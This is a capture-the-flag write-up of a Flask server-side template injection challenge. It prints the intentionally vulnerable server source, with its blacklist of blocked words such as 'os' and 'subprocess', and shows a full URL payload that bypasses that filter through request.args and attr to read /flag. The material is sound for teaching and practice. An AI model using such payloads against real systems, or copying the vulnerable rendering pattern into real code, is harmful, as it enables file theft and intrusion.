---
title: "OSU League 2020/2021 - almostnopship0 Writeup"
date: 2021-02-07
draft: false
description: ""
tags: ["ctf"]
---
For this web challenge, we are given a link to a website that bears a striking resemblance to a certain DEF CON challenge. ~~pew pew~~  

{{< figure src="/img/almost-1.png" >}}

We are told the location of the flag and are provided the source code for the server, along with a nice text box where we can enter our team name. 

{{< figure src="/img/almost-2.png" >}}

Cool! Four P's are better than three. Now Let's take a look at that source code:

```python
from flask import Flask, render_template, request, send_file, render_template_string

app = Flask(__name__)

# scary names!!
blacklist1 = '_[]\'\"\\%'
blacklist2 = ['mro', 'config', 'base', 'join', 'os', 'subprocess']

@app.route('/')
def root():
    name = request.args.get('name')

    if name: 
        name = name.lower()
        if any([c in blacklist1 for c in name]) or any([b in name for b in blacklist2]):
            name = 'stop it :('

    index = render_template('index.html', name=name)
    return render_template_string(index)

@app.route('/src', methods=['GET'])
def src():
    return send_file('server.py')

# todo run NOPs
```

Interesting. We can see that some sort of blacklist has been implemented that prevents us from using certain character.  Let's tests that out and see if it works:

{{< figure src="/img/almost-3.png" >}}

Yep, so our team name wasn't able to go through, what a bummer.  
At this point I started to do some research on what I could possibly do to read the flag off of the server. I knew that it had to be a server side injecton, so I looked into that.  Eventually I came across what is know as a Flask SSTI, a type of server side template injection that Flask can be vulnerable to. I gave the input a simple template of `{{request.args}}` and voila.

{{< figure src="/img/almost-4.png" >}}

Now it's time to start crafting a payload.  We know that we can inject templates in the team name box, but those will all be checked against the blacklist. Maybe there is a way to add additional parameters that could then be read using `request.args`, that way the blacklisted items aren't actually part of `name`, but instead some other variable that we created.  Let's try it out:

`http://ctf-league.osusec.org:31311/?name={{request.args.param1}}&param1=%%Scary_Name%%` 

{{< figure src="/img/almost-5.png" >}}

And there it is. We now have a way to bypass the filter.  Now we just need to figure out how we are going to get the flag. After doing some more research, we were able to find that we could use `request.application` to access python's internal built-in functions. We eventually settled on this for what we wanted to be excecuted on the server:

`request.application.__globals__.get(__builtins__).open(/flag)`

To transform this into a usable payload, however, we had to set it up in such a way so that we could get around the blacklist. We were able to eventually come up with a method to transform any command into a usable payload:

```
a.b = request.args.a|attr(request.args.b)
a(b) = reqiest.args.a(request.args.b)
```

With this we can start to seperate out our command into sections:

```
request.application + __globals__
get() with paramater __builtins__
open() with paramerter __flag__
```

And putting the whole payload together:

`http://ctf-league.osusec.org:31311/?name={{(request.application|attr(request.args.param1)).get(request.args.param2).open(request.args.param3).read()}}&param1=__globals__&param2=__builtins__&param3=/flag`  

We get the flag!

{{< figure src="/img/almost-flag.png" >}}

`osu{but_mY_bLAcKL1st_W4S_so_g00d:(}` 